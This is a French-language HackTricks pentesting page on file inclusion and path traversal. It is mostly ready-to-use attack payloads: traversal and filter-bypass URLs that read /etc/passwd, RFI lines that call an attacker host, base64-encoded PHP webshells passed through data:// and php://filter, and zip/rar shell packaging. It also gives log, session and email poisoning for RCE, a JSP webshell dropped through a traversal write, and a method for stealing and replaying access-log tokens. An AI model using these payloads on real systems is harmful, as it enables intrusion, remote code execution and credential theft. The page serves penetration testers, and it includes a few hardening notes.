# Inclusion de fichiers / Traversée de chemin

{{#include ../../banners/hacktricks-training.md}}

## Inclusion de fichiers

**Remote File Inclusion (RFI):** Le fichier est chargé depuis un serveur distant (Avantage : vous pouvez écrire le code et le serveur l'exécutera). En php ceci est **désactivé** par défaut (**allow_url_include**).\
**Local File Inclusion (LFI):** Le serveur charge un fichier local.

La vulnérabilité survient quand l'utilisateur peut contrôler d'une manière ou d'une autre le fichier qui sera chargé par le serveur.

Fonctions **PHP** vulnérables : require, require_once, include, include_once

Un outil intéressant pour exploiter cette vulnérabilité : [https://github.com/kurobeats/fimap](https://github.com/kurobeats/fimap)

## Blind - Fichiers intéressants - LFI2RCE
```python
wfuzz -c -w ./lfi2.txt --hw 0 http://10.10.10.10/nav.php?page=../../../../../../../FUZZ
```
### **Linux**

**En mélangeant plusieurs listes LFI \*nix et en ajoutant davantage de chemins, j'ai créé celle-ci :**


{{#ref}}
https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/file_inclusion_linux.txt
{{#endref}}

Essayez aussi de remplacer `/` par `\`\
Essayez aussi d'ajouter `../../../../../`

Une liste qui utilise plusieurs techniques pour trouver le fichier /etc/password (pour vérifier si la vulnérabilité existe) peut être trouvée [ici](https://github.com/xmendez/wfuzz/blob/master/wordlist/vulns/dirTraversal-nix.txt)

### **Windows**

Fusion de différentes wordlists:


{{#ref}}
https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/file_inclusion_windows.txt
{{#endref}}

Essayez aussi de remplacer `/` par `\`\
Essayez aussi d'enlever `C:/` et d'ajouter `../../../../../`

Une liste qui utilise plusieurs techniques pour trouver le fichier /boot.ini (pour vérifier si la vulnérabilité existe) peut être trouvée [ici](https://github.com/xmendez/wfuzz/blob/master/wordlist/vulns/dirTraversal-win.txt)

### **OS X**

Consultez la liste LFI de Linux.

## LFI de base et contournements

Tous les exemples sont pour Local File Inclusion mais pourraient aussi s'appliquer à Remote File Inclusion (page=[http://myserver.com/phpshellcode.txt\\](<http://myserver.com/phpshellcode.txt)/>).
```
http://example.com/index.php?page=../../../etc/passwd
```
### traversal sequences supprimées non récursivement
```python
http://example.com/index.php?page=....//....//....//etc/passwd
http://example.com/index.php?page=....\/....\/....\/etc/passwd
http://some.domain.com/static/%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c/etc/passwd
```
### **Null byte (%00)**

Contourner l'ajout de caractères supplémentaires à la fin de la chaîne fournie (contournement de : $\_GET\['param']."php")
```
http://example.com/index.php?page=../../../etc/passwd%00
```
C'est **résolu depuis PHP 5.4**

### **Encodage**

Vous pouvez utiliser des encodages non standard comme double URL encode (et d'autres) :
```
http://example.com/index.php?page=..%252f..%252f..%252fetc%252fpasswd
http://example.com/index.php?page=..%c0%af..%c0%af..%c0%afetc%c0%afpasswd
http://example.com/index.php?page=%252e%252e%252fetc%252fpasswd
http://example.com/index.php?page=%252e%252e%252fetc%252fpasswd%00
```
### Depuis un dossier existant

Peut-être que le back-end vérifie le chemin du dossier :
```python
http://example.com/index.php?page=utils/scripts/../../../../../etc/passwd
```
### Exploration des répertoires du système de fichiers sur un serveur

Le système de fichiers d'un serveur peut être exploré de manière récursive pour identifier des répertoires, pas seulement des fichiers, en utilisant certaines techniques. Ce processus implique de déterminer la profondeur du répertoire et de tester l'existence de dossiers spécifiques. Voici une méthode détaillée pour y parvenir :

1. **Déterminer la profondeur du répertoire :** Déterminez la profondeur de votre répertoire courant en récupérant avec succès le fichier `/etc/passwd` (applicable si le serveur est basé sur Linux). Un exemple d'URL pourrait être structuré comme suit, indiquant une profondeur de trois :
```bash
http://example.com/index.php?page=../../../etc/passwd # depth of 3
```
2. **Sondez les dossiers :** Ajoutez le nom du dossier suspect (par ex., `private`) à l'URL, puis revenez à `/etc/passwd`. Le niveau de répertoire supplémentaire nécessite d'incrémenter la profondeur d'un cran :
```bash
http://example.com/index.php?page=private/../../../../etc/passwd # depth of 3+1=4
```
3. **Interpréter les résultats :** La réponse du serveur indique si le dossier existe :
- **Erreur / Pas de sortie :** Le dossier `private` n'existe probablement pas à l'emplacement spécifié.
- **Contenu de `/etc/passwd` :** La présence du dossier `private` est confirmée.
4. **Exploration récursive :** Les dossiers découverts peuvent être sondés plus en profondeur pour des sous-répertoires ou des fichiers en utilisant la même technique ou les méthodes traditionnelles de Local File Inclusion (LFI).

Pour explorer des répertoires à différents emplacements du système de fichiers, ajustez le payload en conséquence. Par exemple, pour vérifier si `/var/www/` contient un répertoire `private` (en supposant que le répertoire courant est à une profondeur de 3), utilisez :
```bash
http://example.com/index.php?page=../../../var/www/private/../../../etc/passwd
```
### **Path Truncation Technique**

Path truncation est une méthode employée pour manipuler les chemins de fichiers dans les applications web. Elle est souvent utilisée pour accéder à des fichiers restreints en contournant certains mécanismes de sécurité qui ajoutent des caractères supplémentaires à la fin des chemins de fichiers. L'objectif est de construire un chemin de fichier qui, une fois modifié par le mécanisme de sécurité, pointe toujours vers le fichier souhaité.

En PHP, différentes représentations d'un chemin de fichier peuvent être considérées comme équivalentes en raison de la nature du système de fichiers. Par exemple :

- `/etc/passwd`, `/etc//passwd`, `/etc/./passwd`, and `/etc/passwd/` sont tous traités comme le même chemin.
- Quand les 6 derniers caractères sont `passwd`, ajouter un `/` (faisant `passwd/`) ne change pas le fichier ciblé.
- De même, si `.php` est ajouté à un chemin (comme `shellcode.php`), ajouter `/.` à la fin n'altérera pas le fichier accédé.

Les exemples fournis montrent comment utiliser path truncation pour accéder à `/etc/passwd`, une cible courante en raison de son contenu sensible (informations sur les comptes utilisateurs) :
```
http://example.com/index.php?page=a/../../../../../../../../../etc/passwd......[ADD MORE]....
http://example.com/index.php?page=a/../../../../../../../../../etc/passwd/././.[ADD MORE]/././.
```

```
http://example.com/index.php?page=a/./.[ADD MORE]/etc/passwd
http://example.com/index.php?page=a/../../../../[ADD MORE]../../../../../etc/passwd
```
Dans ces scénarios, le nombre de traversals nécessaires peut être d'environ 2027, mais ce nombre peut varier selon la configuration du serveur.

- **Using Dot Segments and Additional Characters**: Les séquences de traversal (`../`) combinées avec des segments de points supplémentaires et des caractères peuvent être utilisées pour naviguer dans le système de fichiers, en ignorant effectivement les chaînes ajoutées par le serveur.
- **Determining the Required Number of Traversals**: Par essais et erreurs, on peut trouver le nombre précis de séquences `../` nécessaires pour atteindre le répertoire racine puis `/etc/passwd`, en s'assurant que toute chaîne ajoutée (comme `.php`) soit neutralisée mais que le chemin souhaité (`/etc/passwd`) reste intact.
- **Starting with a Fake Directory**: Il est courant de commencer le chemin avec un répertoire inexistant (comme `a/`). Cette technique est utilisée comme mesure de précaution ou pour satisfaire la logique d'analyse du chemin côté serveur.

Lors de l'emploi de techniques de path truncation, il est crucial de comprendre le comportement de parsing des chemins du serveur et la structure du système de fichiers. Chaque scénario peut nécessiter une approche différente, et des tests sont souvent nécessaires pour trouver la méthode la plus efficace.

**This vulnerability was corrected in PHP 5.3.**

### **Filter bypass tricks**
```
http://example.com/index.php?page=....//....//etc/passwd
http://example.com/index.php?page=..///////..////..//////etc/passwd
http://example.com/index.php?page=/%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../etc/passwd
Maintain the initial path: http://example.com/index.php?page=/var/www/../../etc/passwd
http://example.com/index.php?page=PhP://filter
```
## Remote File Inclusion

Dans php, cela est désactivé par défaut parce que **`allow_url_include`** est **Off.** Il doit être **On** pour que cela fonctionne, et dans ce cas vous pourriez inclure un fichier PHP depuis votre serveur et obtenir une RCE:
```python
http://example.com/index.php?page=http://atacker.com/mal.php
http://example.com/index.php?page=\\attacker.com\shared\mal.php
```
Si pour une quelconque raison **`allow_url_include`** est **activé**, mais que PHP **filtre** l'accès aux pages web externes, [according to this post](https://matan-h.com/one-lfi-bypass-to-rule-them-all-using-base64/), vous pouvez par exemple utiliser le protocole data avec base64 pour décoder un code PHP b64 et obtenir RCE :
```
PHP://filter/convert.base64-decode/resource=data://plain/text,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+.txt
```
> [!TIP]
> Dans le code précédent, le `+.txt` final a été ajouté parce que l'attaquant avait besoin d'une chaîne se terminant par `.txt`, donc la chaîne se termine par cela et, après le b64 decode, cette partie ne renverra que du junk et le vrai code PHP sera inclus (et donc exécuté).

Un autre exemple **n'utilisant pas le protocole `php://`** serait :
```
data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+txt
```
## Python élément racine

En Python, dans un code comme celui-ci :
```python
# file_name is controlled by a user
os.path.join(os.getcwd(), "public", file_name)
```
Si l'utilisateur passe un **chemin absolu** à **`file_name`**, le **chemin précédent est simplement supprimé** :
```python
os.path.join(os.getcwd(), "public", "/etc/passwd")
'/etc/passwd'
```
C'est le comportement prévu selon [the docs](https://docs.python.org/3.10/library/os.path.html#os.path.join):

> Si un composant est un chemin absolu, tous les composants précédents sont ignorés et la concaténation continue à partir du composant de chemin absolu.

## Java Liste des répertoires

Il semble que si vous avez un Path Traversal en Java et que vous **demandez un répertoire** au lieu d'un fichier, **un listing du répertoire est renvoyé**. Cela ne se produit pas dans d'autres langages (à ma connaissance).

## Top 25 paramètres

Voici la liste des 25 principaux paramètres qui pourraient être vulnérables à local file inclusion (LFI) (d'après [link](https://twitter.com/trbughunters/status/1279768631845494787)):
```
?cat={payload}
?dir={payload}
?action={payload}
?board={payload}
?date={payload}
?detail={payload}
?file={payload}
?download={payload}
?path={payload}
?folder={payload}
?prefix={payload}
?include={payload}
?page={payload}
?inc={payload}
?locate={payload}
?show={payload}
?doc={payload}
?site={payload}
?type={payload}
?view={payload}
?content={payload}
?document={payload}
?layout={payload}
?mod={payload}
?conf={payload}
```
## LFI / RFI utilisant les wrappers et protocoles PHP

### php://filter

Les filtres PHP permettent d'effectuer des opérations de **modification des données** avant qu'elles ne soient lues ou écrites. Il existe 5 catégories de filtres :

- [String Filters](https://www.php.net/manual/en/filters.string.php):
- `string.rot13`
- `string.toupper`
- `string.tolower`
- `string.strip_tags`: Remove tags from the data (everything between "<" and ">" chars)
- Note that this filter has disappear from the modern versions of PHP
- [Conversion Filters](https://www.php.net/manual/en/filters.convert.php)
- `convert.base64-encode`
- `convert.base64-decode`
- `convert.quoted-printable-encode`
- `convert.quoted-printable-decode`
- `convert.iconv.*` : Transforme vers un encodage différent (`convert.iconv.<input_enc>.<output_enc>`). Pour obtenir la **liste de tous les encodages** supportés, lancez en console : `iconv -l`

> [!WARNING]
> En abusant du filtre de conversion `convert.iconv.*` vous pouvez **générer du texte arbitraire**, ce qui peut être utile pour écrire du texte arbitraire ou faire en sorte qu'une fonction comme include traite du texte arbitraire. Pour plus d'infos, voir [**LFI2RCE via php filters**](lfi2rce-via-php-filters.md).

- [Compression Filters](https://www.php.net/manual/en/filters.compression.php)
- `zlib.deflate`: Compresse le contenu (utile si vous exfiltrez beaucoup d'informations)
- `zlib.inflate`: Décompresse les données
- [Encryption Filters](https://www.php.net/manual/en/filters.encryption.php)
- `mcrypt.*` : Déprécié
- `mdecrypt.*` : Déprécié
- Other Filters
- Running in php `var_dump(stream_get_filters());` you can find a couple of **unexpected filters**:
- `consumed`
- `dechunk`: reverses HTTP chunked encoding
- `convert.*`
```php
# String Filters
## Chain string.toupper, string.rot13 and string.tolower reading /etc/passwd
echo file_get_contents("php://filter/read=string.toupper|string.rot13|string.tolower/resource=file:///etc/passwd");
## Same chain without the "|" char
echo file_get_contents("php://filter/string.toupper/string.rot13/string.tolower/resource=file:///etc/passwd");
## string.string_tags example
echo file_get_contents("php://filter/string.strip_tags/resource=data://text/plain,<b>Bold</b><?php php code; ?>lalalala");

# Conversion filter
## B64 decode
echo file_get_contents("php://filter/convert.base64-decode/resource=data://plain/text,aGVsbG8=");
## Chain B64 encode and decode
echo file_get_contents("php://filter/convert.base64-encode|convert.base64-decode/resource=file:///etc/passwd");
## convert.quoted-printable-encode example
echo file_get_contents("php://filter/convert.quoted-printable-encode/resource=data://plain/text,£hellooo=");
=C2=A3hellooo=3D
## convert.iconv.utf-8.utf-16le
echo file_get_contents("php://filter/convert.iconv.utf-8.utf-16le/resource=data://plain/text,trololohellooo=");

# Compresion Filter
## Compress + B64
echo file_get_contents("php://filter/zlib.deflate/convert.base64-encode/resource=file:///etc/passwd");
readfile('php://filter/zlib.inflate/resource=test.deflated'); #To decompress the data locally
# note that PHP protocol is case-inselective (that's mean you can use "PhP://" and any other varient)
```
> [!WARNING]
> La partie "php://filter" n'est pas sensible à la casse

### Utiliser php filters comme oracle pour lire des fichiers arbitraires

[**In this post**](https://www.synacktiv.com/publications/php-filter-chains-file-read-from-error-based-oracle) est proposée une technique pour lire un fichier local sans que le contenu soit renvoyé par le serveur. Cette technique repose sur une **exfiltration booléenne du fichier (caractère par caractère) en utilisant php filters comme oracle**. En effet, les php filters peuvent être utilisés pour rendre un texte suffisamment grand pour que php lève une exception.

Dans le post original vous trouverez une explication détaillée de la technique, voici un résumé rapide :

- Utiliser le codec **`UCS-4LE`** pour laisser le caractère initial du texte en tête et faire croître la taille de la chaîne de façon exponentielle.
- Cela sert à générer un **texte tellement volumineux lorsque la lettre initiale est devinée correctement** que php déclenchera une **erreur**.
- Le filtre **dechunk** va **supprimer tout si le premier char n'est pas un hexadecimal**, donc on peut savoir si le premier char est hex.
- Ceci, combiné avec le précédent (et d'autres filters selon la lettre devinée), permettra de deviner une lettre au début du texte en voyant quand on effectue suffisamment de transformations pour qu'elle ne soit plus un caractère hexadécimal. Car si c'est hex, dechunk ne le supprime pas et la bombe initiale provoquera l'erreur php.
- Le codec **convert.iconv.UNICODE.CP930** transforme chaque lettre en la suivante (donc après ce codec : a -> b). Cela permet de découvrir si la première lettre est un `a` par exemple parce qu'en appliquant 6 fois ce codec a->b->c->d->e->f->g la lettre n'est plus un caractère hexadécimal, donc dechunk ne la supprime pas et l'erreur php est déclenchée à cause de la bombe initiale.
- En utilisant d'autres transformations comme **rot13** au début il est possible de leak d'autres caractères comme n, o, p, q, r (et d'autres codecs peuvent être utilisés pour déplacer d'autres lettres dans la plage hex).
- Lorsque le caractère initial est un chiffre, il est nécessaire de l'encoder en base64 et de leak les 2 premières lettres pour leak le chiffre.
- Le problème final est de voir **comment leak plus que la lettre initiale**. En utilisant des filters d'ordre mémoire comme **convert.iconv.UTF16.UTF-16BE, convert.iconv.UCS-4.UCS-4LE, convert.iconv.UCS-4.UCS-4LE** il est possible de changer l'ordre des caractères et d'amener en première position d'autres lettres du texte.
- Et pour pouvoir obtenir **données supplémentaires** l'idée est de **générer 2 octets de junk au début** avec **convert.iconv.UTF16.UTF16**, appliquer **UCS-4LE** pour faire **pivot avec les 2 octets suivants**, et **supprimer les données jusqu'au junk** (cela supprimera les 2 premiers octets du texte initial). Continuer ainsi jusqu'à atteindre le bit désiré à leak.

Dans le post un outil pour automatiser cela a aussi été leaké : [php_filters_chain_oracle_exploit](https://github.com/synacktiv/php_filter_chains_oracle_exploit).

### php://fd

Ce wrapper permet d'accéder aux file descriptors que le processus a ouverts. Potentiellement utile pour exfiltrer le contenu des fichiers ouverts :
```php
echo file_get_contents("php://fd/3");
$myfile = fopen("/etc/passwd", "r");
```
Vous pouvez aussi utiliser **php://stdin, php://stdout et php://stderr** pour accéder respectivement aux **file descriptors 0, 1 et 2** (je ne sais pas trop comment cela pourrait être utile dans une attaque)

### zip:// and rar://

Téléversez un fichier Zip ou Rar avec un PHPShell à l'intérieur et accédez-y.\
Pour pouvoir abuser du protocole rar il **doit être spécifiquement activé**.
```bash
echo "<pre><?php system($_GET['cmd']); ?></pre>" > payload.php;
zip payload.zip payload.php;
mv payload.zip shell.jpg;
rm payload.php

http://example.com/index.php?page=zip://shell.jpg%23payload.php

# To compress with rar
rar a payload.rar payload.php;
mv payload.rar shell.jpg;
rm payload.php
http://example.com/index.php?page=rar://shell.jpg%23payload.php
```
### data://
```
http://example.net/?page=data://text/plain,<?php echo base64_encode(file_get_contents("index.php")); ?>
http://example.net/?page=data://text/plain,<?php phpinfo(); ?>
http://example.net/?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4=
http://example.net/?page=data:text/plain,<?php echo base64_encode(file_get_contents("index.php")); ?>
http://example.net/?page=data:text/plain,<?php phpinfo(); ?>
http://example.net/?page=data:text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4=
NOTE: the payload is "<?php system($_GET['cmd']);echo 'Shell done !'; ?>"
```
Notez que ce protocole est restreint par les configurations php **`allow_url_open`** et **`allow_url_include`**

### expect://

Expect doit être activé. Vous pouvez exécuter du code en utilisant ceci :
```
http://example.com/index.php?page=expect://id
http://example.com/index.php?page=expect://ls
```
### input://

Spécifiez votre payload dans les paramètres POST :
```bash
curl -XPOST "http://example.com/index.php?page=php://input" --data "<?php system('id'); ?>"
```
### phar://

Un fichier `.phar` peut être utilisé pour exécuter du code PHP lorsqu'une application web utilise des fonctions telles que `include` pour le chargement de fichiers. L'extrait de code PHP ci‑dessous montre la création d'un fichier `.phar` :
```php
<?php
$phar = new Phar('test.phar');
$phar->startBuffering();
$phar->addFromString('test.txt', 'text');
$phar->setStub('<?php __HALT_COMPILER(); system("ls"); ?>');
$phar->stopBuffering();
```
Pour compiler le fichier `.phar`, la commande suivante doit être exécutée :
```bash
php --define phar.readonly=0 create_path.php
```
Lors de l'exécution, un fichier nommé `test.phar` sera créé, ce qui pourrait potentiellement être exploité pour des vulnérabilités Local File Inclusion (LFI).

Dans les cas où le LFI se contente de lire des fichiers sans exécuter le code PHP qu'ils contiennent, via des fonctions telles que `file_get_contents()`, `fopen()`, `file()`, `file_exists()`, `md5_file()`, `filemtime()`, ou `filesize()`, il est possible de tenter d'exploiter une vulnérabilité de désérialisation. Cette vulnérabilité est liée à la lecture de fichiers en utilisant le protocole `phar`.

For a detailed understanding of exploiting deserialization vulnerabilities in the context of `.phar` files, refer to the document linked below:

[Phar Deserialization Exploitation Guide](phar-deserialization.md)


{{#ref}}
phar-deserialization.md
{{#endref}}

### CVE-2024-2961

Il a été possible d'abuser de **any arbitrary file read from PHP that supports php filters** pour obtenir une RCE. The detailed description can be [**found in this post**](https://www.ambionics.io/blog/iconv-cve-2024-2961-p1)**.**\
Résumé très bref : un **3 byte overflow** dans le heap PHP a été exploité pour **altérer la chaîne de free chunks** d'une taille spécifique afin de pouvoir **écrire n'importe quoi dans n'importe quelle adresse**, donc un hook a été ajouté pour appeler **`system`**.\
Il a été possible d'allouer des chunks de tailles spécifiques en abusant d'autres php filters.

### More protocols

Consultez davantage de [ **protocols to include here**](https://www.php.net/manual/en/wrappers.php)**:**

- [php://memory and php://temp](https://www.php.net/manual/en/wrappers.php.php#wrappers.php.memory) — Écrire en mémoire ou dans un fichier temporaire (pas sûr de l'utilité dans une attaque d'inclusion de fichier)
- [file://](https://www.php.net/manual/en/wrappers.file.php) — Accéder au système de fichiers local
- [http://](https://www.php.net/manual/en/wrappers.http.php) — Accéder aux URLs HTTP(s)
- [ftp://](https://www.php.net/manual/en/wrappers.ftp.php) — Accéder aux URLs FTP(s)
- [zlib://](https://www.php.net/manual/en/wrappers.compression.php) — Compression Streams
- [glob://](https://www.php.net/manual/en/wrappers.glob.php) — Find pathnames matching pattern (Ne retourne rien d'imprimable, donc pas vraiment utile ici)
- [ssh2://](https://www.php.net/manual/en/wrappers.ssh2.php) — Secure Shell 2
- [ogg://](https://www.php.net/manual/en/wrappers.audio.php) — Audio streams (Pas utile pour lire des fichiers arbitraires)

## LFI via PHP's 'assert'

Les risques de Local File Inclusion (LFI) en PHP sont particulièrement élevés lorsqu'on traite la fonction 'assert', qui peut exécuter du code contenu dans des chaînes. Cela est particulièrement problématique si une entrée contenant des caractères de directory traversal comme ".." est vérifiée mais pas correctement assainie.

For example, PHP code might be designed to prevent directory traversal like so:
```bash
assert("strpos('$file', '..') === false") or die("");
```
Bien que cela vise à empêcher le traversal, cela crée involontairement un vecteur pour code injection. Pour exploiter cela afin de lire le contenu d'un fichier, un attaquant pourrait utiliser :
```plaintext
' and die(highlight_file('/etc/passwd')) or '
```
De même, pour exécuter des commandes système arbitraires, on pourrait utiliser :
```plaintext
' and die(system("id")) or '
```
Il est important de **URL-encode these payloads**.

## PHP Blind Path Traversal

> [!WARNING]
> Cette technique est pertinente dans les cas où vous **contrôlez** le **chemin de fichier** d'une **fonction PHP** qui va **accéder à un fichier** mais vous ne verrez pas le contenu du fichier (comme un simple appel à **`file()`**) car le contenu n'est pas affiché.

Dans [**this incredible post**](https://www.synacktiv.com/en/publications/php-filter-chains-file-read-from-error-based-oracle.html) il est expliqué comment un blind path traversal peut être abusé via PHP filter pour **exfiltrate the content of a file via an error oracle**.

En résumé, la technique utilise l'encodage **"UCS-4LE"** pour rendre le contenu d'un fichier tellement **gros** que la **fonction PHP qui ouvre** le fichier déclenchera une **erreur**.

Ensuite, afin de leak le premier caractère le filter **`dechunk`** est utilisé avec d'autres tels que **base64** ou **rot13** et enfin les filtres **convert.iconv.UCS-4.UCS-4LE** et **convert.iconv.UTF16.UTF-16BE** sont utilisés pour **placer d'autres caractères au beggining et les leak**.

**Functions that might be vulnerable**: `file_get_contents`, `readfile`, `finfo->file`, `getimagesize`, `md5_file`, `sha1_file`, `hash_file`, `file`, `parse_ini_file`, `copy`, `file_put_contents (only target read only with this)`, `stream_get_contents`, `fgets`, `fread`, `fgetc`, `fgetcsv`, `fpassthru`, `fputs`

Pour les détails techniques, consultez l'article mentionné !

## LFI2RCE

### Arbitrary File Write via Path Traversal (Webshell RCE)

Lorsque le code côté serveur qui ingère/charge des fichiers construit le chemin de destination en utilisant des données contrôlées par l'utilisateur (p. ex., un filename ou URL) sans canoniser ni valider, les segments `..` et les chemins absolus peuvent échapper au répertoire prévu et provoquer un arbitrary file write. Si vous pouvez placer le payload sous un répertoire exposé au web, vous obtenez généralement une RCE non authentifiée en déposant une webshell.

Typical exploitation workflow:
- Identify a write primitive in an endpoint or background worker that accepts a path/filename and writes content to disk (e.g., message-driven ingestion, XML/JSON command handlers, ZIP extractors, etc.).
- Determine web-exposed directories. Common examples:
- Apache/PHP: `/var/www/html/`
- Tomcat/Jetty: `<tomcat>/webapps/ROOT/` → drop `shell.jsp`
- IIS: `C:\inetpub\wwwroot\` → drop `shell.aspx`
- Craft a traversal path that breaks out of the intended storage directory into the webroot, and include your webshell content.
- Browse to the dropped payload and execute commands.

Notes:
- The vulnerable service that performs the write may listen on a non-HTTP port (e.g., a JMF XML listener on TCP 4004). The main web portal (different port) will later serve your payload.
- On Java stacks, these file writes are often implemented with simple `File`/`Paths` concatenation. Lack of canonicalisation/allow-listing is the core flaw.

Generic XML/JMF-style example (product schemas vary – the DOCTYPE/body wrapper is irrelevant for the traversal):
```xml
<?xml version="1.0" encoding="UTF-8"?>
<JMF SenderID="hacktricks" Version="1.3">
<Command Type="SubmitQueueEntry">
<!-- Write outside the intake folder into the webroot via traversal -->
<Resource Name="FileName">../../../webapps/ROOT/shell.jsp</Resource>
<Data>
<![CDATA[
<%@ page import="java.io.*" %>
<%
String c = request.getParameter("cmd");
if (c != null) {
Process p = Runtime.getRuntime().exec(c);
try (var in = p.getInputStream(); var out = response.getOutputStream()) {
in.transferTo(out);
}
}
%>
]]>
</Data>
</Command>
</JMF>
```
Durcissement qui neutralise cette classe de bugs :
- Résoudre vers un chemin canonique et vérifier qu'il est un descendant d'un répertoire de base sur liste blanche.
- Rejeter tout chemin contenant `..`, des racines absolues, ou des lettres de lecteur ; préférer des noms de fichiers générés.
- Exécuter le writer sous un compte à privilèges réduits et séparer les répertoires d'écriture des racines servies.

## Remote File Inclusion

Explained previously, [**follow this link**](#remote-file-inclusion).

### Via Apache/Nginx log file

If the Apache or Nginx server is **vulnerable to LFI** inside the include function you could try to access to **`/var/log/apache2/access.log` or `/var/log/nginx/access.log`**, set inside the **user agent** or inside a **GET parameter** a php shell like **`<?php system($_GET['c']); ?>`** and include that file

> [!WARNING]
> Note that **if you use double quotes** for the shell instead of **simple quotes**, the double quotes will be modified for the string "_**quote;**_", **PHP will throw an error** there and **nothing else will be executed**.
>
> Also, make sure you **write correctly the payload** or PHP will error every time it tries to load the log file and you won't have a second opportunity.

This could also be done in other logs but **be careful,** the code inside the logs could be URL encoded and this could destroy the Shell. The header **authorisation "basic"** contains "user:password" in Base64 and it is decoded inside the logs. The PHPShell could be inserted inside this header.\
Autres chemins de logs possibles :
```python
/var/log/apache2/access.log
/var/log/apache/access.log
/var/log/apache2/error.log
/var/log/apache/error.log
/usr/local/apache/log/error_log
/usr/local/apache2/log/error_log
/var/log/nginx/access.log
/var/log/nginx/error.log
/var/log/httpd/error_log
```
Fuzzing wordlist: [https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/LFI](https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/LFI)

### Lire les access logs pour récupérer les GET-based auth tokens (token replay)

Beaucoup d'apps acceptent par erreur des session/auth tokens via GET (par ex. AuthenticationToken, token, sid). Si vous disposez d'un primitive path traversal/LFI vers les web server logs, vous pouvez voler ces tokens depuis les access logs et les replay pour bypasser complètement l'authentication.

How-to:
- Utilisez le traversal/LFI pour lire le web server access log. Emplacements courants :
- /var/log/apache2/access.log, /var/log/httpd/access_log
- /var/log/nginx/access.log
- Certaines endpoints renvoient les file reads Base64-encoded. Si c'est le cas, décodez localement et inspectez les log lines.
- Grep les GET requests qui incluent un token parameter et capturez sa valeur, puis replayez-la contre l'application entry point.

Example flow (generic):
```http
GET /vuln/asset?name=..%2f..%2f..%2f..%2fvar%2flog%2fapache2%2faccess.log HTTP/1.1
Host: target
```
Décoder le corps s'il est encodé en Base64, puis rejouer un token capturé :
```http
GET /portalhome/?AuthenticationToken=<stolen_token> HTTP/1.1
Host: target
```
Remarques:
- Les tokens dans les URLs sont enregistrés par défaut ; n'acceptez jamais de bearer tokens via GET dans des environnements de production.
- Si l'app supporte plusieurs noms de token, recherchez des clés communes comme AuthenticationToken, token, sid, access_token.
- Renouvelez tous les tokens qui ont pu leaked dans les logs.

### Par e-mail

**Envoyez un mail** à un compte interne (user@localhost) contenant votre payload PHP comme `<?php echo system($_REQUEST["cmd"]); ?>` et essayez de l'inclure dans le mail de l'utilisateur avec un chemin du type **`/var/mail/<USERNAME>`** ou **`/var/spool/mail/<USERNAME>`**

### Via /proc/\*/fd/\*

1. Téléversez beaucoup de shells (par exemple : 100)
2. Incluez [http://example.com/index.php?page=/proc/$PID/fd/$FD](http://example.com/index.php?page=/proc/$PID/fd/$FD), avec $PID = PID du processus (can be brute forced) et $FD le descripteur de fichier (can be brute forced too)

### Via /proc/self/environ

Comme pour un fichier de log, envoyez le payload dans le User-Agent, il sera reflété dans le fichier /proc/self/environ
```
GET vulnerable.php?filename=../../../proc/self/environ HTTP/1.1
User-Agent: <?=phpinfo(); ?>
```
### Via upload

Si vous pouvez upload un fichier, injectez simplement le shell payload dedans (par ex : `<?php system($_GET['c']); ?>` ).
```
http://example.com/index.php?page=path/to/uploaded/file.png
```
Pour que le fichier reste lisible, il est préférable d'injecter dans les métadonnées des images/doc/pdf

### Via téléchargement d'un fichier ZIP

Téléversez un fichier ZIP contenant un PHP shell compressé et accédez :
```python
example.com/page.php?file=zip://path/to/zip/hello.zip%23rce.php
```
### Via PHP sessions

Vérifiez si le site utilise PHP Session (PHPSESSID)
```
Set-Cookie: PHPSESSID=i56kgbsq9rm8ndg3qbarhsbm27; path=/
Set-Cookie: user=admin; expires=Mon, 13-Aug-2018 20:21:29 GMT; path=/; httponly
```
En PHP, ces sessions sont stockées dans _/var/lib/php5/sess\\_\[PHPSESSID]\_ fichiers
```
/var/lib/php5/sess_i56kgbsq9rm8ndg3qbarhsbm27.
user_ip|s:0:"";loggedin|s:0:"";lang|s:9:"en_us.php";win_lin|s:0:"";user|s:6:"admin";pass|s:6:"admin";
```
Définissez le cookie sur `<?php system('cat /etc/passwd');?>`
```
login=1&user=<?php system("cat /etc/passwd");?>&pass=password&lang=en_us.php
```
Utilisez le LFI pour inclure le fichier de session PHP
```
login=1&user=admin&pass=password&lang=/../../../../../../../../../var/lib/php5/sess_i56kgbsq9rm8ndg3qbarhsbm2
```
### Via ssh

Si ssh est actif, vérifiez quel utilisateur est utilisé (/proc/self/status & /etc/passwd) et essayez d'accéder à **\<HOME>/.ssh/id_rsa**

### **Via** **vsftpd** _**logs**_

Les logs du serveur FTP vsftpd se trouvent à _**/var/log/vsftpd.log**_. Dans le cas où une vulnérabilité Local File Inclusion (LFI) est présente, et que l'accès à un serveur vsftpd exposé est possible, les étapes suivantes peuvent être envisagées :

1. Injecter un payload PHP dans le champ username lors du processus de connexion.
2. Après l'injection, utiliser la LFI pour récupérer les logs du serveur depuis _**/var/log/vsftpd.log**_.

### Via php base64 filter (using base64)

Comme montré dans [this](https://matan-h.com/one-lfi-bypass-to-rule-them-all-using-base64) article, le filtre PHP base64 ignore simplement les caractères non-base64. Vous pouvez l'utiliser pour contourner la vérification de l'extension de fichier : si vous fournissez un base64 qui se termine par ".php", il va simplement ignorer le "." et ajouter "php" au base64. Voici un exemple de payload:
```url
http://example.com/index.php?page=PHP://filter/convert.base64-decode/resource=data://plain/text,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+.php

NOTE: the payload is "<?php system($_GET['cmd']);echo 'Shell done !'; ?>"
```
### Via php filters (no file needed)

